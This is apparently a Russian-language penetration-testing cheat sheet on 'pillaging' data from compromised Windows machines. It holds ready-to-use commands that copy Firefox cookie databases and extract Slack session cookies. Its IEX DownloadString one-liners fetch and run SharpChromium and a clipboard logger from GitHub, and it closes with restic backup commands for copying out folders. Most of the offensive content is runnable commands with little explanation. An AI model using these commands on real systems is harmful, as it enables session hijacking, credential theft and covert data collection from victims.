#creds #AD #windows 

> **Pillaging** (Грабеж) — это процесс получения информации из скомпрометированной системы. Это может быть личная информация, корпоративные планы, данные кредитных карт, информация о серверах, сведения об инфраструктуре и сети, пароли или другие типы учетных данных, а также все, что имеет отношение к компании или к оценке безопасности, над которой мы работаем.

## Оглавление
- [[#Источники, из которых мы можем получить информацию из скомпрометированных систем:]]
- [[#1) Просмотр конфигурационных файлов установленных приложений]]
- [[#2) Поиск файлов куки пользователей]]
- [[#3) Извлечение данных из Буфера Обмена (Clipboard)]]
- [[#4) Создание резервных копий]]

---

## Источники, из которых мы можем получить информацию из скомпрометированных систем:

- Установленные приложения
- Установленные услуги
    - Веб-сайты
    - Файловые ресурсы
    - Базы данных
    - Службы каталогов (такие как Active Directory, Azure AD и т. д.)
    - Серверы имен
    - Услуги по развертыванию
    - Центр сертификации
    - Сервер управления исходным кодом
    - Виртуализация
    - Обмен сообщениями
    - Системы мониторинга и регистрации данных
    - Резервные копии
- Конфиденциальные данные
    - Запись нажатия клавиши
    - Скриншот
    - Захват сетевого трафика
    - Предыдущие аудиторские отчеты
- Информация о пользователе
    - Исторические файлы, интересные документы (.doc/x, .xls/x, password _/pass_ и т. д.)
    - Роли и привилегии
    - Веб-браузеры
    - Клиенты мессенджеров


## 1) Просмотр конфигурационных файлов установленных приложений

Большинство из них находится в 
- `Program Files`
- `Program Files (x86)`


## 2) Поиск файлов куки пользователей

```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Извлечение из БД
```bash
python3 cookieextractor.py --dbpath "cookies.sqlite" --host slack --cookie <name>
```

Можно также использовать инструмент [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47)

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')

Invoke-SharpChromium -Command "cookies slack.com"
```


## 3) Извлечение данных из Буфера Обмена (Clipboard)

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

Invoke-ClipboardLogger
```

## 4) Создание резервных копий

Используем **restic**

скачиваем и кладем сюда
`C:\Windows\System32\restic.exe`

Создаем дирректорию
```powershell
mkdir E:\restic2; restic.exe -r E:\restic2 init
```

Резервное копирование каталога
```powershell
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder
```

Можно воспользоваться флагом `--use-fs-snapshot` с целью пропуска задействованных файлов с помощью VSS

 Проверка резервных копий, сохраненных в репозитории
```powershell
restic.exe -r E:\restic2\ snapshots
```

Восстановление резервной копии с использованием ID
```powershell
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

